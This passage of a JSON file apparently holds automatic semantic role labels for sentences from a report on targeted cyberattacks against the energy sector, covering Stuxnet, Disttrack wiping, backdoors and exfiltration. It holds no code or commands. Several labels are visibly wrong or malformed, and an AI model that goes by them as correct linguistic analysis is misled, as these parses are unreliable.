{"text": "machinery"}, "ARGM-ADV": {"text": "preventing oil tankers from loading for eight hour till"}}, "preventing": {"ARG0": {"text": "This halted"}, "V": {"text": "preventing", "index": 4}, "ARG1": {"text": "oil tankers"}, "ARG2": {"text": "from loading"}, "ARGM-TMP": {"text": "for eight hour till the unaffected backup code was reinstalled on the PLCs"}}, "loading": {"ARG0": {"text": "oil tankers"}, "V": {"text": "loading", "index": 8}, "ARGM-TMP": {"text": "for eight hour"}}, "was": {"V": {"text": "was", "index": 17}}, "reinstalled": {"ARG1": {"text": "till the unaffected backup code"}, "V": {"text": "reinstalled", "index": 18}, "ARGM-LOC": {"text": "on the PLCs"}}}, " Spreading through infected\n  portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the\n  Internet": {"Spreading": {"V": {"text": "Spreading", "index": 0}, "ARGM-DIR": {"text": "through infected portable"}, "ARG0": {"text": "media drives"}}, "allowed": {"R-ARG0": {"text": "Spreading through infected"}, "ARG0": {"text": "portable media drives"}, "V": {"text": "allowed", "index": 6}, "ARG1": {"text": "it to also infect networks isolated by air gaps that are unreachable from the Internet"}}, "infect": {"ARG0": {"text": "it"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "infect", "index": 10}, "ARG1": {"text": "networks isolated by air gaps that are unreachable from the Internet"}}, "isolated": {"V": {"text": "isolated", "index": 12}, "ARG0": {"text": "by air gaps that are unreachable from the Internet"}}, "are": {"ARG1": {"text": "air gaps"}, "R-ARG1": {"text": "that"}, "V": {"text": "are", "index": 17}, "ARG2": {"text": "unreachable from the Internet"}}}, " The malware deletes all files\n\n\n\n\n                                     <footer>       Page 27</footer>\n\f                                                              <header>  Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n   on a computer and then deletes the master boot record, rendering the computer unusable": {"deletes": {"ARG0": {"text": "The malware"}, "V": {"text": "deletes", "index": 2}, "ARG1": {"text": "all files"}, "ARG2": {"text": "on a computer"}}, "deletes_2": {"ARG0": {"text": "The malware"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "deletes", "index": 10}, "ARG1": {"text": "the master boot record"}}, "rendering": {"ARG0": {"text": "The malware"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "rendering", "index": 16}, "ARG1": {"text": "the computer"}, "ARG2": {"text": "unusable"}}}, " The sabotage payload disrupted and\n  partially destroyed the cascaded high frequency gas centrifuges": {"disrupted": {"ARG0": {"text": "The sabotage"}, "ARG1": {"text": "payload"}, "V": {"text": "disrupted", "index": 3}}, "destroyed": {"ARG0": {"text": "The sabotage payload"}, "ARGM-MNR": {"text": "partially"}, "V": {"text": "destroyed", "index": 6}, "ARG1": {"text": "the cascaded high frequency gas centrifuges"}}, "cascaded": {"V": {"text": "cascaded", "index": 8}, "ARG1": {"text": "high frequency/ gas centrifuges"}}}, " The attacks started in late 2009 and were directed\n  at finding project details and financial information about oil and gas field exploration and bids": {"started": {"ARG1": {"text": "The attacks"}, "V": {"text": "started", "index": 2}, "ARGM-TMP": {"text": "in late 2009"}}, "were": {"V": {"text": "were", "index": 7}}, "directed": {"ARG1": {"text": "The attacks"}, "V": {"text": "directed", "index": 8}, "ARG2": {"text": "at finding project details and financial information about oil and gas field exploration and bids"}}, "finding": {"V": {"text": "finding", "index": 10}, "ARG1": {"text": "project details and financial information about oil and gas field exploration and bids"}}}, "\n\n  On compromised computers a common Backdoor.Trojan was installed that communicated back to the\n  C&C server, allowing remote access to the computer": {"compromised": {"V": {"text": "compromised", "index": 1}, "ARG1": {"text": "computers"}, "ARGM-MNR": {"text": "a common Backdoor"}}, "was": {"ARG1": {"text": "Trojan"}, "V": {"text": "was", "index": 8}, "ARG2": {"text": "installed"}}, "installed": {"ARG1": {"text": "Trojan"}, "V": {"text": "installed", "index": 9}, "ARG2": {"text": "that communicated back to the C&C server , allowing remote access to the computer"}}, "communicated": {"ARG0": {"text": "Trojan"}, "R-ARG0": {"text": "that"}, "V": {"text": "communicated", "index": 11}, "ARG2": {"text": "back to the C&C server"}, "ARGM-ADV": {"text": "allowing remote access to the computer"}}, "allowing": {"ARG0": {"text": "that"}, "V": {"text": "allowing", "index": 18}, "ARG1": {"text": "remote access to the computer"}}}, " It also attempts to copy itself to accessible network shares\n  and execute itself remotely if successfully copied": {"attempts": {"ARG0": {"text": "It"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "attempts", "index": 2}, "ARG1": {"text": "to copy itself to accessible network shares"}}, "copy": {"ARG0": {"text": "It"}, "V": {"text": "copy", "index": 4}, "ARG1": {"text": "itself"}, "ARG2": {"text": "to accessible network shares"}}, "execute": {"ARG0": {"text": "It"}, "V": {"text": "execute", "index": 11}, "ARG1": {"text": "itself"}, "ARG3": {"text": "remotely"}, "ARGM-ADV": {"text": "if successfully copied"}}, "copied": {"ARGM-MNR": {"text": "successfully"}, "V": {"text": "copied", "index": 16}}}, " Since most employees use laptops, the malware can use location awareness to detect if the\ncompromised computer is outside of the corporate network and send the data once it\u2019s directly connected to the\nInternet, such as from a Wi-Fi hotspot at an airport": {"use": {"ARG0": {"text": "most employees"}, "V": {"text": "use", "index": 3}, "ARG1": {"text": "laptops"}}, "can": {"V": {"text": "can", "index": 8}}, "use_2": {"ARGM-CAU": {"text": "Since most employees use laptops"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "use", "index": 9}, "ARG1": {"text": "location awareness"}, "ARG2": {"text": "to detect if the compromised computer is outside of the corporate network and send the data once it \u2019s directly connected to the Internet , such as from a Wi - Fi hotspot at an airport"}}, "detect": {"V": {"text": "detect", "index": 13}, "ARG1": {"text": "if the compromised computer is outside of the corporate network and/ , such as from a Wi - Fi hotspot at an airport"}}, "compromised": {"V": {"text": "compromised", "index": 16}, "ARG1": {"text": "computer"}}, "is": {"ARG1": {"text": "the compromised computer"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "outside of the corporate network"}}, "send": {"ARG0": {"text": "the compromised computer"}, "V": {"text": "send", "index": 25}, "ARG1": {"text": "the data"}, "ARGM-TMP": {"text": "once it \u2019s directly connected to the Internet ,"}, "C-ARG1": {"text": "such as from a Wi - Fi hotspot at an airport"}}, "connected": {"ARG1": {"text": "it"}, "ARGM-MNR": {"text": "directly"}, "V": {"text": "connected", "index": 32}, "ARG2": {"text": "to the Internet"}}}, " Disttrack\u2019s secondary goal may have\n  been to steal valuable information from infected computers, but the main intent was to render the computers\n  unusable by wiping the operating system and master boot record, causing disruption and downtime at the\n  targeted company": {"may": {"V": {"text": "may", "index": 4}}, "have": {"V": {"text": "have", "index": 5}}, "been": {"ARG1": {"text": "Disttrack \u2019s secondary goal"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "been", "index": 6}, "ARG2": {"text": "to steal valuable information from infected computers"}}, "steal": {"ARG0": {"text": "Disttrack \u2019s secondary goal"}, "V": {"text": "steal", "index": 8}, "ARG1": {"text": "valuable information"}, "ARG2": {"text": "from infected computers"}}, "was": {"ARG1": {"text": "the main intent"}, "V": {"text": "was", "index": 19}, "ARG2": {"text": "to render the computers unusable by wiping the operating system and master boot record , causing disruption and downtime at the targeted company"}}, "render": {"V": {"text": "render", "index": 21}, "ARG1": {"text": "the computers"}, "ARG2": {"text": "unusable by wiping the operating system and master boot record , causing disruption and downtime at the targeted company"}}, "wiping": {"V": {"text": "wiping", "index": 26}, "ARG1": {"text": "the operating system and master boot record"}, "ARGM-ADV": {"text": "causing disruption and downtime at the targeted company"}}, "causing": {"V": {"text": "causing", "index": 35}, "ARG1": {"text": "disruption and downtime at the targeted company"}}, "targeted": {"V": {"text": "targeted", "index": 41}, "ARG1": {"text": "company"}}}, " Tricks like these, to make the detection of the malware more\n  difficult, are now frequently used in modern targeted attacks": {"make": {"V": {"text": "make", "index": 5}, "ARG1": {"text": "the detection of the malware more difficult"}}, "are": {"V": {"text": "are", "index": 14}}, "used": {"ARG1": {"text": "Tricks like these"}, "ARGM-PRP": {"text": "to make the detection of the malware more difficult"}, "ARGM-TMP": {"text": "now/ frequently"}, "V": {"text": "used", "index": 17}, "ARGM-LOC": {"text": "in modern targeted attacks"}}, "targeted": {"V": {"text": "targeted", "index": 20}, "ARG1": {"text": "attacks"}}}, " After that comes the discovery phase, where the attacker gathers\n    passwords and maps the internal network": {"comes": {"V": {"text": "comes", "index": 2}, "ARG1": {"text": "the discovery phase , where the attacker gathers passwords and maps the internal network"}}, "gathers": {"R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the attacker"}, "V": {"text": "gathers", "index": 10}, "ARG1": {"text": "passwords"}}}, " They were made to appear to be linked to the\ncompany in relation to the subject and attachment chosen": {"were": {"V": {"text": "were", "index": 1}}, "made": {"V": {"text": "made", "index": 2}, "ARG1": {"text": "to appear to be linked to the company in relation to the subject and attachment chosen"}}, "appear": {"ARG1": {"text": "They"}, "V": {"text": "appear", "index": 4}, "C-ARG1": {"text": "to be linked to the company in relation to the subject and attachment chosen"}}, "be": {"V": {"text": "be", "index": 6}}, "linked": {"ARG1": {"text": "They"}, "V": {"text": "linked", "index": 7}, "C-ARG1": {"text": "to the company in relation to the subject and attachment chosen"}}, "chosen": {"ARG1": {"text": "attachment"}, "V": {"text": "chosen", "index": 18}}}, " More sophisticated attackers obfuscate the data by XOR-ing it, encrypting it with proper\nasymmetric encryption or embedding it into media files using steganography to hide the data from traffic inspection": {"obfuscate": {"ARG0": {"text": "More sophisticated attackers/ XOR - ing it"}, "V": {"text": "obfuscate", "index": 3}, "ARG1": {"text": "the data"}, "ARG2": {"text": "by"}, "ARGM-ADV": {"text": "encrypting it with proper asymmetric encryption or embedding it into media files using steganography to hide the data from traffic inspection"}}, "ing": {"ARG0": {"text": "XOR"}, "V": {"text": "ing", "index": 9}, "ARG1": {"text": "it"}}, "encrypting": {"ARG0": {"text": "More sophisticated attackers"}, "V": {"text": "encrypting", "index": 12}, "ARG1": {"text": "it"}, "ARGM-MNR": {"text": "with"}, "ARG4": {"text": "proper asymmetric encryption"}}, "embedding": {"ARG0": {"text": "More sophisticated attackers"}, "V": {"text": "embedding", "index": 19}, "ARG1": {"text": "it"}, "ARG2": {"text": "into media files"}, "ARGM-MNR": {"text": "using steganography"}, "ARGM-PRP": {"text": "to hide the data from traffic inspection"}}, "using": {"V": {"text": "using", "index": 24}, "ARG1": {"text": "steganography"}, "ARG2": {"text": "to hide the data from traffic inspection"}}, "hide": {"V": {"text": "hide", "index": 27}, "ARG1": {"text": "the data"}, "ARG2": {"text": "from traffic inspection"}}}, " The malware chosen\nwas a variant of the Poison Ivy Trojan Backdoor.Darkmoon and, in some minor cases, Trojan droppers that would\ndownload additional malware": {"chosen": {"ARG1": {"text": "The malware"}, "V": {"text": "chosen", "index": 2}}, "was": {"ARG1": {"text": "The malware chosen"}, "V": {"text": "was", "index": 3}, "ARG2": {"text": "a variant of the Poison Ivy Trojan Backdoor . Darkmoon and , in some minor cases , Trojan droppers that would download additional malware"}}, "would": {"V": {"text": "would", "index": 24}}, "download": {"ARG0": {"text": "Trojan droppers"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "download", "index": 25}, "ARG1": {"text": "additional malware"}}}, " Besides this, it also spread through network\n  shares, a printer spooler vulnerability, an old Windows RPC (remote procedure calls) vulnerability and a known\n  password in the WinCC database": {"spread": {"ARGM-ADV": {"text": "Besides this"}, "ARG1": {"text": "it"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "spread", "index": 5}, "ARGM-DIR": {"text": "through network shares , a printer spooler vulnerability , an old Windows RPC ( remote procedure calls ) vulnerability and a known password in the WinCC database"}}, "known": {"V": {"text": "known", "index": 27}, "ARG1": {"text": "password"}}}, " As far as we know today, the Stuxnet operation began in November 2005 with the registration\n  of the command and control (C&C) servers used in the attacks": {"know": {"ARG0": {"text": "we"}, "V": {"text": "know", "index": 4}, "ARGM-TMP": {"text": "today"}}, "began": {"ARGM-ADV": {"text": "As far as we know today"}, "ARG1": {"text": "the Stuxnet operation"}, "V": {"text": "began", "index": 10}, "ARGM-TMP": {"text": "in November 2005"}, "ARG2": {"text": "with the registration of the command and control ( C&C ) servers used in the attacks"}}, "used": {"ARG1": {"text": "( C&C ) servers"}, "V": {"text": "used", "index": 26}, "ARGM-LOC": {"text": "in the attacks"}}}, " The simple attacks compress the files and upload them through FTP or through a HTTP POST request\nto a remote drop server": {"compress": {"ARG0": {"text": "The simple attacks"}, "V": {"text": "compress", "index": 3}, "ARG1": {"text": "the files"}}, "upload": {"ARG0": {"text": "The simple attacks"}, "V": {"text": "upload", "index": 7}, "ARG1": {"text": "them"}, "ARGM-MNR": {"text": "through FTP"}, "ARGM-DIR": {"text": "or through a HTTP POST request to a remote drop server"}}}, " The early version of Stuxnet targeted the S7-\n  417 PLCs and modified its valve settings": {"targeted": {"ARG0": {"text": "The early version of Stuxnet"}, "V": {"text": "targeted", "index": 5}, "ARG1": {"text": "the S7- 417 PLCs"}}, "modified": {"ARG0": {"text": "The early version of Stuxnet"}, "V": {"text": "modified", "index": 11}, "ARG1": {"text": "its valve settings"}}}, "\n\n  Stuxnet is a sophisticated piece of malware, which uses seven vulnerabilities to spread and infect its targets": {"is": {"ARG1": {"text": "Stuxnet"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a sophisticated piece of malware , which uses seven vulnerabilities to spread and infect its targets"}}, "uses": {"ARG0": {"text": "malware"}, "R-ARG0": {"text": "which"}, "V": {"text": "uses", "index": 9}, "ARG1": {"text": "seven vulnerabilities"}, "ARG2": {"text": "to spread and infect its targets"}}, "spread": {"ARG1": {"text": "which"}, "V": {"text": "spread", "index": 13}}, "infect": {"ARG0": {"text": "which"}, "V": {"text": "infect", "index": 15}, "ARG1": {"text": "its targets"}}}, " This can enable the attacker to\nswap an update of legitimate software for a maliciously crafted version": {"can": {"V": {"text": "can", "index": 1}}, "enable": {"ARG0": {"text": "This"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "enable", "index": 2}, "ARG2": {"text": "the attacker"}, "ARG1": {"text": "to swap an update of legitimate software for a maliciously crafted version"}}, "swap": {"ARG0": {"text": "the attacker"}, "V": {"text": "swap", "index": 6}, "ARG1": {"text": "an update of legitimate software"}, "ARG3": {"text": "for a maliciously crafted version"}}, "crafted": {"ARGM-MNR": {"text": "maliciously"}, "V": {"text": "crafted", "index": 15}, "ARG1": {"text": "version"}}}, " In\nsuch cases, a previously compromised computer in the DMZ can act as a proxy, forwarding all the collected data": {"compromised": {"ARGM-TMP": {"text": "previously"}, "V": {"text": "compromised", "index": 6}, "ARG1": {"text": "computer"}}, "can": {"V": {"text": "can", "index": 11}}, "act": {"ARGM-LOC": {"text": "In such cases"}, "ARG0": {"text": "a previously compromised computer in the DMZ"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "act", "index": 12}, "ARG1": {"text": "as a proxy"}, "ARGM-ADV": {"text": "forwarding all the collected data"}}, "forwarding": {"ARG0": {"text": "a previously compromised computer in the DMZ"}, "V": {"text": "forwarding", "index": 17}, "ARG1": {"text": "all the collected data"}}, "collected": {"V": {"text": "collected", "index": 20}, "ARG1": {"text": "data"}}}, " On the USB drive itself, the malware would hide its own files and even delete\n  itself from it after three successful propagations": {"would": {"V": {"text": "would", "index": 8}}, "hide": {"ARGM-LOC": {"text": "On the USB drive itself"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "hide", "index": 9}, "ARG1": {"text": "its own files and even delete"}, "ARGM-TMP": {"text": "after three successful propagations"}}, "delete": {"ARGM-LOC": {"text": "On the USB drive itself"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "would"}, "ARGM-ADV": {"text": "even"}, "V": {"text": "delete", "index": 15}, "ARG1": {"text": "itself"}, "ARG2": {"text": "from it"}, "ARGM-TMP": {"text": "after three successful propagations"}}}, "\n  To hide its activity even further, Stuxnet executed slightly different infection routines depending on the security\n  software installed on the target": {"hide": {"V": {"text": "hide", "index": 1}, "ARG1": {"text": "its activity"}, "ARGM-EXT": {"text": "even further"}, "ARG0": {"text": "Stuxnet"}}, "executed": {"R-ARG0": {"text": "To hide its activity even further"}, "ARG0": {"text": "Stuxnet"}, "V": {"text": "executed", "index": 8}, "ARG1": {"text": "slightly different infection routines"}, "ARGM-ADV": {"text": "depending on the security software installed on the target"}}, "depending": {"V": {"text": "depending", "index": 13}, "ARG1": {"text": "on the security software installed on the target"}}, "installed": {"ARG1": {"text": "the security software"}, "V": {"text": "installed", "index": 18}, "ARG2": {"text": "on the target"}}}, "\n\nThe emails all contained malicious attachments": {"contained": {"ARGM-ADV": {"text": "all"}, "V": {"text": "contained", "index": 3}, "ARG1": {"text": "malicious attachments"}}}, " The malware collects file names and starts overwriting them\n  with a JPEG image or 192KB blocks of random data": {"collects": {"ARG0": {"text": "The malware"}, "V": {"text": "collects", "index": 2}, "ARG1": {"text": "file names"}}, "file": {"ARG0": {"text": "The malware collects"}, "V": {"text": "file", "index": 3}, "ARG1": {"text": "names"}}, "overwriting": {"ARG0": {"text": "The malware collects file names and starts overwriting"}, "ARG1": {"text": "them"}, "ARGM-MNR": {"text": "with a JPEG image or 192 KB blocks of random data"}}}, "\n\nOne of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local\nstorage for saved accounts and sniff the network for passwords": {"performed": {"ARG1": {"text": "the obvious tasks"}, "V": {"text": "performed", "index": 5}, "ARG0": {"text": "by attackers"}}, "is": {"ARG1": {"text": "One of the obvious tasks performed by attackers"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "to install key loggers , dump local credentials , search local storage for saved accounts and sniff the network for passwords"}}, "install": {"V": {"text": "install", "index": 10}, "ARG1": {"text": "key loggers"}}, "dump": {"V": {"text": "dump", "index": 14}, "ARG1": {"text": "local credentials"}}, "search": {"V": {"text": "search", "index": 18}, "ARG1": {"text": "local storage for saved accounts"}}, "saved": {"V": {"text": "saved", "index": 22}, "ARG1": {"text": "accounts"}}, "sniff": {"V": {"text": "sniff", "index": 25}, "ARG1": {"text": "the network"}, "ARG2": {"text": "for passwords"}}}, "\n\n  By acquiring user credentials and gaining access to the domain controller the attackers were able to push the\n  malware on to many systems before they triggered the destructive payload": {"acquiring": {"V": {"text": "acquiring", "index": 1}, "ARG1": {"text": "user credentials"}}, "gaining": {"V": {"text": "gaining", "index": 5}, "ARG1": {"text": "access"}, "ARG2": {"text": "to the domain"}}, "were": {"ARGM-MNR": {"text": "By acquiring user credentials and gaining access to the domain controller"}, "ARG1": {"text": "the attackers"}, "V": {"text": "were", "index": 13}, "ARG2": {"text": "able to push the malware on to many systems before they triggered the destructive payload"}}, "push": {"ARG0": {"text": "the attackers"}, "V": {"text": "push", "index": 16}, "ARG1": {"text": "the malware"}, "ARG2": {"text": "on to many systems"}, "ARGM-TMP": {"text": "before they triggered the destructive payload"}}, "triggered": {"ARG0": {"text": "they"}, "V": {"text": "triggered", "index": 25}, "ARG1": {"text": "the destructive payload"}}}, "\n<figure></figure>\n<caption>Figure 9: Typical commands used during discovery phase</caption>\nIf the target is assumed to be in a separated network not connected to the Internet, the malware used might try and\nautonomously infect removable drives, like USB sticks, or project files for PLCs": {"is": {"V": {"text": "is", "index": 3}}, "assumed": {"V": {"text": "assumed", "index": 4}, "ARG1": {"text": "to be in a separated network not connected to the Internet"}}, "be": {"ARG1": {"text": "the target"}, "V": {"text": "be", "index": 6}, "ARG2": {"text": "in a separated network not connected to the Internet"}}, "separated": {"V": {"text": "separated", "index": 9}, "ARG1": {"text": "network"}}, "connected": {"ARGM-NEG": {"text": "not"}, "V": {"text": "connected", "index": 12}, "ARG2": {"text": "to the Internet"}}, "used": {"V": {"text": "used", "index": 19}}, "might": {"V": {"text": "might", "index": 20}}, "try": {"ARGM-ADV": {"text": "If the target is assumed to be in a separated network not connected to the Internet"}, "ARG0": {"text": "the malware used"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "try", "index": 21}, "ARGM-MNR": {"text": "and autonomously/ like USB sticks , or project files for PLCs"}, "ARG1": {"text": "infect removable drives"}}, "infect": {"ARGM-ADV": {"text": "If the target is assumed to be in a separated network not connected to the Internet"}, "ARG0": {"text": "the malware used"}, "ARGM-MOD": {"text": "might"}, "ARGM-MNR": {"text": "try and autonomously/ like USB sticks , or project files for PLCs"}, "V": {"text": "infect", "index": 24}, "ARG1": {"text": "removable drives"}}}, " The attackers used a Trojan to gain access to the control for the gas pipelines": {"used": {"ARG0": {"text": "The attackers"}, "V": {"text": "used", "index": 2}, "ARG1": {"text": "a Trojan"}, "ARG2": {"text": "to gain access to the control for the gas pipelines"}}, "gain": {"ARG0": {"text": "The attackers"}, "V": {"text": "gain", "index": 6}, "ARG1": {"text": "access to the control for the gas pipelines"}}}, "\n\nThe social engineering messages concentrated mainly around the following two themes:\n<list>\nE-books and newspapers:\n\u2022\t E-Book.pdf.exe\n\u2022\t BusinessWeek.pdf.exe\n\u2022\t Financial Times E-Paper.pdf.exe\n\u2022\t The Economist Print Edition.pdf.exe\n\u2022\t The NY Times In Print.pdf.exe\nFree desktop tools:\n\u2022\t Babylon9 - Greek.exe\n\u2022\t Google Desktop Translator.exe\n\u2022\t SMS Free Sender Desktop.exe\n\u2022\t BBC iPlayer.exe\n\u2022\t Sticky Notes Desktop.exe\n</list>\nOnce installed, the back door would create a registry run key in order to restart with Windows and connect to\none of three C&C servers located in Greece": {"concentrated": {"ARG0": {"text": "The social engineering messages"}, "V": {"text": "concentrated", "index": 4}, "ARGM-MNR": {"text": "mainly"}, "ARGM-LOC": {"text": "around the following two themes"}}, "following": {"V": {"text": "following", "index": 8}, "ARG1": {"text": "two themes"}}, "installed": {"ARGM-TMP": {"text": "Once"}, "V": {"text": "installed", "index": 13}}, "would": {"V": {"text": "would", "index": 18}}, "create": {"ARGM-TMP": {"text": "Once installed"}, "ARG0": {"text": "the back door"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "create", "index": 19}, "ARG1": {"text": "a registry run key"}, "ARGM-PRP": {"text": "in order to restart with Windows and connect to one of three C&C servers located in Greece"}}, "run": {"ARGM-MNR": {"text": "registry"}, "V": {"text": "run", "index": 22}, "ARG1": {"text": "key"}}, "restart": {"V": {"text": "restart", "index": 27}, "ARG2": {"text": "with Windows"}}, "connect": {"V": {"text": "connect", "index": 31}, "ARG1": {"text": "to one of three C&C servers located in Greece"}}, "located": {"ARG1": {"text": "one of three C&C servers"}, "V": {"text": "located", "index": 38}, "ARGM-LOC": {"text": "in Greece"}}}, "\n\nSome groups carefully plan watering hole attacks": {"plan": {"ARG0": {"text": "Some groups"}, "ARGM-MNR": {"text": "carefully"}, "V": {"text": "plan", "index": 3}, "ARG1": {"text": "watering hole attacks"}}, "watering": {"V": {"text": "watering", "index": 4}, "ARG1": {"text": "hole attacks"}}}, " The\n  payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup": {"would": {"V": {"text": "would", "index": 2}}, "become": {"ARG1": {"text": "The payload"}, "ARGM-MOD": {"text": "would"}, "ARGM-ADV": {"text": "only/ if the fingerprint in the found PLC setup matched a given configuration setup"}, "V": {"text": "become", "index": 4}, "ARG2": {"text": "active"}}, "found": {"V": {"text": "found", "index": 11}, "ARG1": {"text": "PLC setup"}}, "matched": {"ARG0": {"text": "the fingerprint in the found PLC setup"}, "V": {"text": "matched", "index": 14}, "ARG1": {"text": "a given configuration setup"}}, "given": {"V": {"text": "given", "index": 16}, "ARG1": {"text": "configuration setup"}}}, " All of the emails contained the same\n    Trojan.Dropper disguised as an attachment with the filename AVP.dll": {"contained": {"ARG0": {"text": "All of the emails"}, "V": {"text": "contained", "index": 4}, "ARG1": {"text": "the same Trojan . Dropper disguised as an attachment with the filename AVP.dll"}}, "disguised": {"ARG1": {"text": "the same Trojan/ Dropper"}, "V": {"text": "disguised", "index": 10}, "ARG2": {"text": "as an attachment with the filename AVP.dll"}}}, "\n\n  The reporter component is responsible for sending back a HTTP GET request to the C&C server": {"is": {"V": {"text": "is", "index": 3}, "ARG2": {"text": "responsible for sending back a HTTP GET request to the C&C server"}}, "sending": {"V": {"text": "sending", "index": 6}, "ARGM-DIR": {"text": "back"}, "ARG1": {"text": "a HTTP GET request to the C&C server"}}, "GET": {"ARGM-MNR": {"text": "HTTP"}, "V": {"text": "GET", "index": 10}, "ARG1": {"text": "request"}}}, " In some instances\nthey might even use zero-day\nvulnerabilities to spread further into\nthe network": {"might": {"V": {"text": "might", "index": 4}}, "use": {"ARGM-MNR": {"text": "In some instances"}, "ARG0": {"text": "they"}, "ARGM-MOD": {"text": "might"}, "ARGM-ADV": {"text": "even"}, "V": {"text": "use", "index": 6}, "ARG1": {"text": "zero - day vulnerabilities"}, "ARG2": {"text": "to spread further into the network"}}, "spread": {"ARG1": {"text": "they"}, "V": {"text": "spread", "index": 12}, "ARGM-ADV": {"text": "further"}, "ARGM-GOL": {"text": "into the network"}}}, " This allows\n    malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet": {"allows": {"ARG0": {"text": "This"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet"}}, "spread": {"V": {"text": "spread", "index": 4}, "ARGM-DIR": {"text": "into such isolated networks"}, "ARGM-ADV": {"text": "as demonstrated many times by threats such as Stuxnet"}}, "demonstrated": {"V": {"text": "demonstrated", "index": 10}, "ARGM-TMP": {"text": "many times"}, "ARG0": {"text": "by threats such as Stuxnet"}}}, " Stuxnet is the first known autonomous\n  threat to target and sabotage industrial control systems to such an extent": {"is": {"ARG1": {"text": "Stuxnet"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "the first known autonomous threat to target"}}, "known": {"ARGM-TMP": {"text": "first"}, "V": {"text": "known", "index": 4}, "ARG1": {"text": "autonomous threat"}}, "target": {"ARG0": {"text": "the first known autonomous threat"}, "V": {"text": "target", "index": 8}, "ARG1": {"text": "industrial control systems"}}, "sabotage": {"ARG0": {"text": "Stuxnet"}, "V": {"text": "sabotage", "index": 10}, "ARG1": {"text": "industrial control systems"}, "ARGM-EXT": {"text": "to such an extent"}}}, " The attacker usually compromises the network by delivering targeted\nmalware to vulnerable systems or employees": {"compromises": {"ARG0": {"text": "The attacker"}, "ARGM-TMP": {"text": "usually"}, "V": {"text": "compromises", "index": 3}, "ARG1": {"text": "the network"}, "ARGM-MNR": {"text": "by delivering targeted malware to vulnerable systems or employees"}}, "delivering": {"ARG0": {"text": "The attacker"}, "V": {"text": "delivering", "index": 7}, "ARG1": {"text": "targeted malware"}, "ARG2": {"text": "to vulnerable systems or employees"}}, "targeted": {"ARGM-MNR": {"text": "delivering"}, "V": {"text": "targeted", "index": 8}, "ARG1": {"text": "malware"}}}, " Details of this attack\n    are scarce and vague, but it seems that during a strike an attacking group managed to get access to the SCADA\n    network of the oil tanker loading machinery and overwrote programmable logic controllers (PLCs) with an empty\n    program module": {"are": {"ARG1": {"text": "Details of this attack"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "scarce and vague"}}, "seems": {"V": {"text": "seems", "index": 11}, "ARG1": {"text": "that during a strike an attacking group managed to get access to the SCADA network of the oil tanker loading machinery and overwrote programmable logic controllers ( PLCs ) with an empty program module"}}, "managed": {"ARG0": {"text": "an attacking group"}, "V": {"text": "managed", "index": 19}, "ARG1": {"text": "to get access to the SCADA network of the oil tanker loading machinery"}}, "get": {"ARG0": {"text": "group"}, "V": {"text": "get", "index": 21}, "ARG1": {"text": "access to the SCADA network of the oil tanker loading machinery"}}, "loading": {"ARG0": {"text": "oil tanker"}, "V": {"text": "loading", "index": 31}, "ARG1": {"text": "machinery"}}}, " This might allow the traffic to bypass perimeter security and\nreceive less scrutiny": {"might": {"V": {"text": "might", "index": 1}}, "allow": {"ARG0": {"text": "This"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "allow", "index": 2}, "ARG1": {"text": "the traffic to bypass perimeter security and receive less scrutiny"}}, "bypass": {"ARG0": {"text": "the traffic"}, "V": {"text": "bypass", "index": 6}, "ARG1": {"text": "perimeter security"}}, "receive": {"ARG0": {"text": "the traffic"}, "V": {"text": "receive", "index": 10}, "ARG1": {"text": "less scrutiny"}}}, "\n\n  The attackers started by compromising public facing Web servers through SQL injection and installing Web\n  shells on them": {"started": {"ARG1": {"text": "The attackers"}, "V": {"text": "started", "index": 2}, "ARG2": {"text": "by compromising public facing Web servers through SQL injection and installing Web shells on them"}}, "compromising": {"V": {"text": "compromising", "index": 4}, "ARG1": {"text": "public facing Web servers"}, "ARG2": {"text": "through SQL injection"}}, "facing": {"ARG0": {"text": "public"}, "V": {"text": "facing", "index": 6}, "ARG1": {"text": "Web servers"}}, "installing": {"V": {"text": "installing", "index": 13}, "ARG1": {"text": "Web shells"}, "ARG2": {"text": "on them"}}}, " To avoid detection by personnel monitoring the human machine\n  interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played\n  those back in a loop": {"avoid": {"V": {"text": "avoid", "index": 1}, "ARG1": {"text": "detection by personnel monitoring the human machine interface ( HMI ) of the plant"}}, "monitoring": {"ARG0": {"text": "personnel"}, "V": {"text": "monitoring", "index": 5}, "ARG1": {"text": "the human machine interface"}}, "recorded": {"V": {"text": "recorded", "index": 19}, "ARG1": {"text": "measurement readings"}}, "played": {"ARGM-PRP": {"text": "To avoid detection by personnel monitoring the human machine interface ( HMI ) of the plant"}, "ARG0": {"text": "the threat recorded measurement readings"}, "V": {"text": "played", "index": 26}, "ARG1": {"text": "those"}, "ARG2": {"text": "in a loop"}}}, " This allowed the worm to infect\n  computers whenever the engineer exchanged the project files": {"allowed": {"ARG0": {"text": "This"}, "V": {"text": "allowed", "index": 1}, "ARG1": {"text": "the worm to infect computers whenever the engineer exchanged the project files"}}, "infect": {"ARG0": {"text": "the worm"}, "V": {"text": "infect", "index": 5}, "ARG1": 